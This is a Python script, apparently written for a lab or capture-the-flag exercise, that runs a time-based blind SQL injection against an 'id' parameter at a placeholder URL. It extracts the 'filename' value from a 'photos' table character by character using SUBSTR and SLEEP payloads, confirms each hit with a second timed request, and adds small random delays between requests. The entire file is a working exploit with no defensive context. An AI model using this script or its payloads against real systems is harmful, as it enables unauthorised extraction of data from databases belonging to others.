import requests
import string
import signal
import time
from random import randint
from pwn import log


def salir_con_ctrl_c(signal, frame):
    log.info("Saliendo....")
    exit(1)

def obtener_letras_abecedario():
    rango = string.ascii_lowercase + ',' + "1234567890"
    return rango

def validar_letras(url):
    letras_abecedario = obtener_letras_abecedario()
    signal.signal(signal.SIGINT, salir_con_ctrl_c)
    tiempo_espera = 1.2  # Tiempo de espera en segundos
    letras_identificadas = ''
    p1 = log.progress("Ejecutando Blind SQLinjection")
    p2 = log.progress("Columnas")
    for ubica in range(1, 60):
        for letra in letras_abecedario:
            params = {
                'id': f"1 AND IF(SUBSTR((SELECT filename FROM photos WHERE id=3), {ubica}, 1) = '{letra}', SLEEP({tiempo_espera}), 1)-- -"
            }
            try:
                response = requests.get(url, params=params)
                tiempo_respuesta = response.elapsed.total_seconds()
                p1.status(f"Probando letra: {letra}")
                if tiempo_respuesta >= tiempo_espera:
                    # Realizar una segunda validaciÃ³n
                    params_2 = {
                        'id': f"1 AND IF(SUBSTR((SELECT filename FROM photos WHERE id=3), {ubica}, 1) = '{letra}', SLEEP({tiempo_espera * 2}), 1)-- -"
                    }
                    response_2 = requests.get(url, params=params_2)
                    tiempo_respuesta_2 = response_2.elapsed.total_seconds()
                    if tiempo_respuesta_2 >= tiempo_espera * 2:
                        time.sleep(randint(1,9)/100)
                        letras_identificadas += letra
                        p2.status(f"Columnas encontrada: {letras_identificadas}")
                        break
            except requests.exceptions.RequestException as e:
                log.error(f"Error en la solicitud: {e}")
                break

url = "https://example.com/fetch"  # Reemplaza con la URL de tu instancia
validar_letras(url)
